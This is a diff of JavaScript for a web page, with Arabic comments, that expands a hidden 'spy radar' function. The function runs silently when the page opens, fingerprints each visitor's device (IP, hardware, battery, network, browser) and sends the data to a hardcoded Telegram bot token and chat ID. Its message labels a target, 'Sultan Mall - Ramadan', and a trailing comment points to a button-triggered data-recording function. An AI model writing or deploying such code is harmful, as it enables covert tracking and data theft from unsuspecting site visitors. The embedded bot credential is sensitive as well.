@@ -73,18 +73,25 @@
     const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
     const chatId = "7388801889"; 
 
-    // --- 1. رادار "الدخول الصامت" (يشتغل فور فتح الصفحة) ---
+    // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
-        let device = navigator.userAgent;
+        // معلومات المتصفح والنظام
+        let ua = navigator.userAgent;
         let platform = navigator.platform;
+        let language = navigator.language;
+        let cores = navigator.hardwareConcurrency || "غير معروف"; // عدد نويات المعالج
+        let ram = navigator.deviceMemory || "غير معروف"; // الذاكرة العشوائية GB
         let screenRes = `${window.screen.width}x${window.screen.height}`;
+        let colorDepth = window.screen.colorDepth;
+        let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف"; // نوع الشبكة (4G/WiFi)
+
         let batteryInfo = "غير متاح";
         let ipAddr = "جاري الجلب...";
 
-        // جلب البطارية
+        // جلب تفاصيل البطارية (الشحن والحالة)
         try {
             const battery = await navigator.getBattery();
-            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
+            batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ الحالة: ${battery.charging ? 'جاري الشحن الآن' : 'لا يشحن حالياً'}`;
         } catch (e) {}
 
         // جلب الـ IP
@@ -94,19 +101,28 @@
             ipAddr = data.ip;
         } catch (e) {}
 
-        const initialMsg = `
-🚨 دخول جديد للموقع!
+        const megaMsg = `
+🚨 رادار ZeroX العملاق - دخول جديد!
+----------------------------------
 🌐 الـ IP: ${ipAddr}
-📱 الجهاز: ${platform}
-🔋 البطارية: ${batteryInfo}
-🖥️ الشاشة: ${screenRes}
-📄 تفاصيل: ${device.substring(0, 100)}...
+🌐 نوع الشبكة: ${connection}
+📱 الجهاز/النظام: ${platform}
+🧠 نويات المعالج: ${cores} Core
+📟 الذاكرة (RAM): ${ram} GB تقريباً
+🔋 حالة البطارية: ${batteryInfo}
+----------------------------------
+🖥️ دقة الشاشة: ${screenRes}
+🎨 عمق الألوان: ${colorDepth} bit
+🌍 اللغة الأساسية: ${language}
+🌐 المتصفح: ${ua}
+----------------------------------
+📍 الموقع المستهدف: السلطان مول - رمضان 🌙
         `;
         
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(initialMsg)}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(megaMsg)}`);
     }
 
-    // تشغيل الرادار الصامت فوراً
+    // تشغيل الرادار فوراً
     silentRadar();
 
     // --- 2. دالة تسجيل البيانات (تشتغل عند ضغط الزر) ---
